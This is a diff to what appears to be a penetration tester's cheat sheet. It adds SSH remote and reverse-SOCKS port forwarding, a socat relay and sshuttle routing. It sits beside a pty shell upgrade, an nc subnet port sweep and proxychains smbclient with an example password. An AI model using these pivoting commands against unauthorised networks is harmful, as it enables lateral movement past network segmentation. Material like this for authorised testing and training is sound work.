@@ -30,14 +30,33 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 for i in {0..255}; do nc -zv -w 1 10.0.20.$i 8080; done
 
 #SSH local port forwarding, listening on all interfaces on on host's port 4455, forwarding through SSH tunnel between current host and 10.0.20.1 to 10.10.10.1 port 5544
-#Meaning: outside<--->host:4455<->host<---SSH TUNNEL--->10.0.20.1<--->10.10.10.1:5544, N makes sure not to open a shell and L means local forwarding, no output after password
+#Meaning: outside<--->host:4455<->host<---SSH TUNNEL--->10.0.20.1<--->10.10.10.1:5544, -N makes sure not to open a shell and -L means local forwarding, no output after password
 ssh -N -L 0.0.0.0:4455:10.10.10.1:5544 r00t@10.0.20.1
 
 #SSH dynamic port forwarding, listening on hosts all interfaces for connections to port 3456, then forwarding traffic through a tunnel between the host an 10.0.20.1 to any destination port
 #Meaning outside<--->host:3456<->host<---SSH TUNNEL--->10.0.20.1<--->any host and port on this side, this is SOCKS, so might need for example proxychains to force traffic as SOCSK
 ssh -N -D 0.0.0.0:3456 r00t@10.0.20.1
-#To use proxychains you'd need to add "socks5 192.168.50.63 3456" to /etc/proxychains4.conf, then just normally connect preceeding with proxychains command: proxychains smbclient -L //10.0.30.1/ -U admin --password=r00t
+#To use proxychains you'd need to add "socks5 10.0.20.1 3456" to /etc/proxychains4.conf, then just normally connect preceeding with proxychains command: proxychains smbclient -L //10.0.30.1/ -U admin --password=r00t
 #You can also run nmap over this tunnel with proxychains
+
+#SSH remote port forwarding, you need to have sshd running on your machine
+# -N makes sure not to open a shell and -R means remote forwarding
+# From your remote host running SSHD on localhost on port 5432 redirect through the host running this command to 10.10.10.1 port 5432 authenticating on your remote host's LAN/WAN side sshd
+ssh -N -R 127.0.0.1:2345:10.10.10.1:5432 user@192.168.12.34
+
+#SSH remote dynamic port forwarding, again you need sshd running on your machine
+# -N makes sure not to open a shell and -R means remote forwarding
+# Binds to your hosts loopback port 6666 from the connecting host, authenticating over your host's LAN/WAN side sshd
+ssh -N -R 6666 user@192.168.12.34
+#To use proxychains to pass traffic to socks you just edit socks on /etc/proxychains4.conf to:
+# socks5 127.0.0.1 9998
+
+#We can also leverage https://github.com/sshuttle/sshuttle if you want to pass certain destination networks through an SSH tunnel, this though requires high privileges
+#On the "jump" host:
+socat TCP-LISTEN:1234,fork TCP:10.0.20.1:22
+#On your host
+sshuttle -r user@192.168.11.11:1234 10.0.20.0/24 172.16.0.0/24
+#Then all connections from your host over to 10.0.20.0/24 or 172.16.0.0/24 should flow through the tunnel
 
 ----
 
